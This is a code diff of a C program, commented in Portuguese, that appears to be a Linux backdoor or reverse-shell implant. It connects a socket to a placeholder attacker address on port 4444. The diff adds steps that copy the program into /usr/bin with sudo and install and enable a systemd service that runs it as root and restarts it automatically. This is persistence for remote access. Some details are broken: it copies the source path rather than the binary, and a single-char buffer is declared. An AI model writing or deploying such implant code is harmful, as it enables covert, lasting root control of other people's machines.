@@ -11,7 +11,7 @@ int main() {
     struct sockaddr_in addr;
     char buffer;
     const char *ip = "192.168.1.100"; // trocar ip
-    int port = 4444; // trocar porta 
+    int port = 4444; // trocar porta
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
@@ -19,7 +19,7 @@ int main() {
         return 1;
     }
 
-    // endereçamento
+    // Endereçamento
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
@@ -30,15 +30,23 @@ int main() {
         return 1;
     }
 
-    // Criação do arquivo de serviço no diretório temporário
+    // Caminho do binário
+    const char *bin_path = "/usr/bin/bico"; // Caminho onde o binário será copiado
+
+    // Copiar o binário para /usr/bin/
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "sudo cp %s /usr/bin/bico && sudo chmod +x /usr/bin/bico", __FILE__);
+    system(cmd);
+
+    // Criar o arquivo de serviço
     FILE *file = fopen("/tmp/bico.service", "w");
     if (file) {
         fprintf(file, "[Unit]\nDescription=bico service\nAfter=network.target\n\n");
-        fprintf(file, "[Service]\nType=forking\nExecStart=/full/path/to/bico\nRestart=always\nUser=root\nStandardOutput=journal\nStandardError=journal\nRestartSec=5\n\n", __FILE__);
+        fprintf(file, "[Service]\nType=forking\nExecStart=%s\nRestart=always\nUser=root\nStandardOutput=journal\nStandardError=journal\nRestartSec=5\n\n", bin_path);
         fprintf(file, "[Install]\nWantedBy=multi-user.target\n");
         fclose(file);
 
-        // Usar sudo para mover o serviço para o diretório correto e configurar o systemd
+        // Mover o serviço para o diretório correto e configurar o systemd
         system("sudo mv /tmp/bico.service /etc/systemd/system/bico.service");
         system("sudo systemctl daemon-reload");
         system("sudo systemctl enable bico.service");
